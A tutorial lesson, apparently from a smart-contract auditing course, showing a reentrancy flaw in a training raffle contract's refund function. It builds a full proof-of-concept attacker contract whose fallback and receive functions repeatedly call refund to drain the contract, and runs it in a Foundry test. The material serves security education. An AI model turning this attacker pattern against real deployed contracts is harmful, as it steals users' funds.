---
title: Reentrancy - PoC
---

_Follow along with this video:_

---

### Reentrancy in PuppyRaffle

Returning to PuppyRaffle, let's look at how all we've learnt affects this protocol.

A look again at this `refund` function and we see a classic case of reentrancy with an external call being made before updating state.

```js
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // @Audit: Reentrancy
    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

### The PoC

We can start by writing a new test in the protocol's `PuppyRaffle.t.sol` file. We'll have a bunch of players enter the raffle.

```js
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

}
```

> **Note:** There _is_ a `playersEntered` modifier we could use, included in this test suite, but we'll choose to be explicit here.

Next we'll create our `ReentrancyAttacker` Contract.

```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
}
```

Once deployed, this `attack` function is going to kick off the attack. In order, we're entering the raffle, acquiring our `playerIndex`, and then refunding our `entranceFee`.

This is going to cause our entranceFee to be sent back to our contract ... what happens then?

```js
function _stealMoney() internal {
    if (address(puppyRaffle).balance >= entranceFee) {
        puppyRaffle.refund(attackerIndex);

    }
}

fallback() external payable {
    _stealMoney();
}

receive() external payable {
    _stealMoney();
}
```

Adding these functions to our `ReentrancyAttacker` contract finishes the job. When funds are sent back to our contract, the `fallback` or `receive` functions are called which is going to trigger another `refund` call in our `_stealMoney` function, completing the loop until the `PuppyRaffle` contract is drained!

<details>
<summary> ReentrancyAttacker Contract </summary>

```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);

        }
    }
    fallback() external payable {
        _stealMoney();
    }
    receive() external payable {
        _stealMoney();
    }
}
```

</details>
:br

Alright, let's add this logic to our test. First we'll create an instance of the attacker contract and an attacker address, funding it with 1 ether.

```js
ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
address attacker = makeAddr("attacker");
vm.deal(attacker, 1 ether);
```

Next, we'll grab some balances so we're able to log our changes after the attack.

```js
uint256 startingAttackContractBalance = address(attackerContract).balance;
uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
```

We finally call the attack, like so:

```js
vm.prank(attacker);
attackerContract.attack{value: entranceFee}();
```

Then we'll console.log the impact:

```js
console.log("attackerContract balance: ", startingAttackContractBalance);
console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
console.log(
  "ending attackerContract balance: ",
  address(attackerContract).balance
);
console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
```

<details>
<summary>test_reentrancyRefund</summary>

```js
function test_reentrancyRefund() public {
    // users entering raffle
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    // create attack contract and user
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    // noting starting balances
    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

    // attack
    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();

    // impact
    console.log("attackerContract balance: ", startingAttackContractBalance);
    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
    console.log("ending attackerContract balance: ", address(attackerContract).balance);
    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
}
```

</details>
:br

All we need to do now is run this test with the command `forge test --mt test_reentrancyRefund -vvv` and we should receive...

![reentrancy-poc1](/security-section-4/23-reentrancy-poc/reentrancy-poc1.png)

### Wrap Up

We did it! We've proven the vulnerability through our application of our PoC and we'll absolutely be submitting this as a finding - likely a `High`.

Be very proud of what you've learnt so far, you're now armed to safeguard De-Fi against some of the most prevalent vulnerabilities in Web3.

Let's go back to the code back and continue our recon in the next lesson.
